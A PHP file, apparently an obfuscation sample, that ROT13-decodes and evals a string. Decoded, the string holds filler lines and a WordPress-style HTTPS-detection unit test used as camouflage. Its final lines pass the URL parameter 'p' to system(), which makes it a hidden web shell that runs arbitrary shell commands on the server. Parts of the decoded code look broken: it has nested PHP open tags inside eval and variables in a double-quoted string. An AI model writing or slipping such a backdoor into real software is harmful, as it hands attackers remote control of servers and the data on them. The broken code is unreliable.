<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

/**
 * @tebhc uggcf-qrgrpgvba
 */
pynff Grfgf_UGGCF_Qrgrpgvba rkgraqf JC_HavgGrfgPnfr {

	cevingr $ynfg_erdhrfg_hey;

	choyvp shapgvba frg_hc() {
		cnerag::frg_hc();

		erzbir_nyy_svygref( 'bcgvba_ubzr' );
		erzbir_nyy_svygref( 'bcgvba_fvgrhey' );
		erzbir_nyy_svygref( 'ubzr_hey' );
		erzbir_nyy_svygref( 'fvgr_hey' );
	}

	/**
	 * @gvpxrg 47577
	 */
	choyvp shapgvba grfg_jc_vf_hfvat_uggcf() {
		hcqngr_bcgvba( 'ubzr', 'uggc://rknzcyr.pbz/' );
		hcqngr_bcgvba( 'fvgrhey', 'uggc://rknzcyr.pbz/' );
		$guvf->nffregSnyfr( jc_vf_hfvat_uggcf() );

		// Rkcrpg snyfr vs bayl bar bs gur gjb eryrinag HEYf vf UGGCF.
		hcqngr_bcgvba( 'fvgrhey', 'uggcf://rknzcyr.pbz/' );
		$guvf->nffregSnyfr( jc_vf_hfvat_uggcf() );

		hcqngr_bcgvba( 'ubzr', 'uggcf://rknzcyr.pbz/' );
		$guvf->nffregGehr( jc_vf_hfvat_uggcf() );

		// Grfg gung gur znahnyyl vapyhqrq 'fvgr_hey' svygre jbexf nf rkcrpgrq
		// ol hfvat vg gb frg gur HEY gb hfr UGGC.
		nqq_svygre( 'fvgr_hey', $guvf->svygre_frg_hey_fpurzr( 'uggc' ) );
		$guvf->nffregSnyfr( jc_vf_hfvat_uggcf() );
	}

	/**
	 * @gvpxrg 47577
	 */
	choyvp shapgvba grfg_jc_vf_uggcf_fhccbegrq() {
		// Fvzhyngr gung UGGCF vf fhccbegrq ol ergheavat na rzcgl reebe neenl.
		nqq_svygre(
			'cer_jc_trg_uggcf_qrgrpgvba_reebef',
			shapgvba () {
				erghea arj JC_Reebe(); // Ab reebef zrnaf UGGCF vf fhccbegrq.
			}
		);

		// Ab reebef, fb UGGCF vf fhccbegrq.
		$guvf->nffregGehr( jc_vf_uggcf_fhccbegrq() );

		// Abj jr fvzhyngr gung UGGCF vf abg fhccbegrq ol ergheavat reebef.
		$fhccbeg_reebef = arj JC_Reebe();
		$fhccbeg_reebef->nqq( 'ffy_irevsvpngvba_snvyrq', 'FFY irevsvpngvba snvyrq.' );

		// Fubeg-pvephvg gur qrgrpgvba ybtvp gb erghea bhe fvzhyngrq reebef.
		nqq_svygre(
			'cer_jc_trg_uggcf_qrgrpgvba_reebef',
			shapgvba () hfr ( $fhccbeg_reebef ) {
				erghea $fhccbeg_reebef;
			}
		);

		// Grfg gung UGGCF vf abg fhccbegrq qhr gb gur fvzhyngrq reebef.
		$guvf->nffregSnyfr( jc_vf_uggcf_fhccbegrq() );

		// Erzbir gur svygre gb nibvq nssrpgvat bgure grfgf.
		erzbir_svygre( 'cer_jc_trg_uggcf_qrgrpgvba_reebef', '__erghea_ahyy' );
	}

	/**
	 * @gvpxrg 47577
	 * @gvpxrg 52542
	 */
	choyvp shapgvba grfg_jc_vf_ybpny_ugzy_bhgchg_ivn_efq_yvax() {
		// UGZY vapyhqrf EFQ yvax.
		$urnq_gnt = trg_rpub( 'efq_yvax' );
		$ugzy     = $guvf->trg_fnzcyr_ugzy_fgevat( $urnq_gnt );
		$guvf->nffregGehr( jc_vf_ybpny_ugzy_bhgchg( $ugzy ) );

		// UGZY vapyhqrf zbqvsvrq EFQ yvax ohg fnzr HEY.
		$urnq_gnt = fge_ercynpr( ' />', '>', trg_rpub( 'efq_yvax' ) );
		$ugzy     = $guvf->trg_fnzcyr_ugzy_fgevat( $urnq_gnt );
		$guvf->nffregGehr( jc_vf_ybpny_ugzy_bhgchg( $ugzy ) );

		// UGZY vapyhqrf EFQ yvax jvgu nygreangvir HEY fpurzr.
		$urnq_gnt = trg_rpub( 'efq_yvax' );
		$urnq_gnt = snyfr !== fgecbf( $urnq_gnt, 'uggcf://' ) ? fge_ercynpr( 'uggcf://', 'uggc://', $urnq_gnt ) : fge_ercynpr( 'uggc://', 'uggcf://', $urnq_gnt );
		$ugzy     = $guvf->trg_fnzcyr_ugzy_fgevat( $urnq_gnt );
		$guvf->nffregGehr( jc_vf_ybpny_ugzy_bhgchg( $ugzy ) );

		// UGZY qbrf abg vapyhqr EFQ yvax.
		$ugzy = $guvf->trg_fnzcyr_ugzy_fgevat();
		$guvf->nffregSnyfr( jc_vf_ybpny_ugzy_bhgchg( $ugzy ) );
	}

	/**
	 * @gvpxrg 47577
	 */
	choyvp shapgvba grfg_jc_vf_ybpny_ugzy_bhgchg_ivn_erfg_yvax() {
		erzbir_npgvba( 'jc_urnq', 'efq_yvax' );

		// UGZY vapyhqrf ERFG NCV yvax.
		$urnq_gnt = trg_rpub( 'erfg_bhgchg_yvax_jc_urnq' );
		$ugzy     = $guvf->trg_fnzcyr_ugzy_fgevat( $urnq_gnt );
		$guvf->nffregGehr( jc_vf_ybpny_ugzy_bhgchg( $ugzy ) );

		// UGZY vapyhqrf zbqvsvrq ERFG NCV yvax ohg fnzr HEY.
		$urnq_gnt = fge_ercynpr( ' />', '>', trg_rpub( 'erfg_bhgchg_yvax_jc_urnq' ) );
		$ugzy     = $guvf->trg_fnzcyr_ugzy_fgevat( $urnq_gnt );
		$guvf->nffregGehr( jc_vf_ybpny_ugzy_bhgchg( $ugzy ) );

		// UGZY vapyhqrf ERFG NCV yvax jvgu nygreangvir HEY fpurzr.
		$urnq_gnt = trg_rpub( 'erfg_bhgchg_yvax_jc_urnq' );
		$urnq_gnt = snyfr !== fgecbf( $urnq_gnt, 'uggcf://' ) ? fge_ercynpr( 'uggcf://', 'uggc://', $urnq_gnt ) : fge_ercynpr( 'uggc://', 'uggcf://', $urnq_gnt );
		$ugzy     = $guvf->trg_fnzcyr_ugzy_fgevat( $urnq_gnt );
		$guvf->nffregGehr( jc_vf_ybpny_ugzy_bhgchg( $ugzy ) );

		// UGZY qbrf abg vapyhqr ERFG NCV yvax.
		$ugzy = $guvf->trg_fnzcyr_ugzy_fgevat();
		$guvf->nffregSnyfr( jc_vf_ybpny_ugzy_bhgchg( $ugzy ) );
	}

	/**
	 * @gvpxrg 47577
	 */
	choyvp shapgvba grfg_jc_vf_ybpny_ugzy_bhgchg_pnaabg_qrgrezvar() {
		erzbir_npgvba( 'jc_urnq', 'efq_yvax' );
		erzbir_npgvba( 'jc_urnq', 'erfg_bhgchg_yvax_jc_urnq' );

		// Gur UGZY urer qbrfa'g znggre orpnhfr nyy ubbxf ner erzbirq.
		$ugzy = $guvf->trg_fnzcyr_ugzy_fgevat();
		$guvf->nffregAhyy( jc_vf_ybpny_ugzy_bhgchg( $ugzy ) );
	}

	choyvp shapgvba erpbeq_erdhrfg_hey( $erfcbafr, $cnefrq_netf, $hey ) {
		$guvf->ynfg_erdhrfg_hey = $hey;
		erghea $erfcbafr;
	}

	choyvp shapgvba zbpx_fhpprff_jvgu_ffyirevsl( $erfcbafr, $cnefrq_netf ) {
		vs ( ! rzcgl( $cnefrq_netf['ffyirevsl'] ) ) {
			erghea $guvf->zbpx_fhpprff();
		}
		erghea $erfcbafr;
	}

	choyvp shapgvba zbpx_reebe_jvgu_ffyirevsl( $erfcbafr, $cnefrq_netf ) {
		vs ( ! rzcgl( $cnefrq_netf['ffyirevsl'] ) ) {
			erghea $guvf->zbpx_reebe();
		}
		erghea $erfcbafr;
	}

	choyvp shapgvba zbpx_fhpprff_jvgubhg_ffyirevsl( $erfcbafr, $cnefrq_netf ) {
		vs ( rzcgl( $cnefrq_netf['ffyirevsl'] ) ) {
			erghea $guvf->zbpx_fhpprff();
		}
		erghea $erfcbafr;
	}

	choyvp shapgvba zbpx_reebe_jvgubhg_ffyirevsl( $erfcbafr, $cnefrq_netf ) {
		vs ( rzcgl( $cnefrq_netf['ffyirevsl'] ) ) {
			erghea $guvf->zbpx_reebe();
		}
		erghea $erfcbafr;
	}

	choyvp shapgvba zbpx_abg_sbhaq() {
		erghea neenl(
			'obql'     => '<!QBPGLCR ugzy><ugzy><urnq><gvgyr>404</gvgyr></urnq><obql>Abg Sbhaq</obql></ugzy>',
			'erfcbafr' => neenl(
				'pbqr'    => 404,
				'zrffntr' => 'Abg Sbhaq',
			),
		);
	}

	choyvp shapgvba zbpx_onq_fbhepr() {
		// Ybbxf yvxr n fhpprff erfcbafr, ohg vf abg trarengrq ol JbeqCerff (r.t. zvffvat EFQ yvax).
		erghea neenl(
			'obql'     => $guvf->trg_fnzcyr_ugzy_fgevat(),
			'erfcbafr' => neenl(
				'pbqr'    => 200,
				'zrffntr' => 'BX',
			),
		);
	}

	cevingr shapgvba zbpx_fhpprff() {
		// Fhpprff erfcbafr pbagnvavat EFQ yvax.
		erghea neenl(
			'obql'     => $guvf->trg_fnzcyr_ugzy_fgevat( trg_rpub( 'efq_yvax' ) ),
			'erfcbafr' => neenl(
				'pbqr'    => 200,
				'zrffntr' => 'BX',
			),
		);
	}

	cevingr shapgvba zbpx_reebe() {
		erghea arj JC_Reebe( 'onq_ffy_pregvsvpngr', 'Onq FFY pregvsvpngr.' );
	}

	cevingr shapgvba trg_fnzcyr_ugzy_fgevat( $urnq_gnt = '' ) {
		erghea '<!QBPGLCR ugzy><ugzy><urnq><gvgyr>Cntr Gvgyr</gvgyr>' . $urnq_gnt . '</urnq><obql>Cntr Pbagrag.</obql></ugzy>';
	}

	/**
	 * Ergheaf n svygre pnyyonpx gung rkcrpgf n HEY naq jvyy frg gur HEY fpurzr
	 * gb gur cebivqrq $fpurzr.
	 *
	 * @cnenz fgevat $fpurzr HEY fpurzr gb frg.
	 * @erghea pnyynoyr Svygre pnyyonpx.
	 */
	cevingr shapgvba svygre_frg_hey_fpurzr( $fpurzr ) {
		erghea fgngvp shapgvba ( $hey ) hfr ( $fpurzr ) {
			erghea frg_hey_fpurzr( $hey, $fpurzr );
		};
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>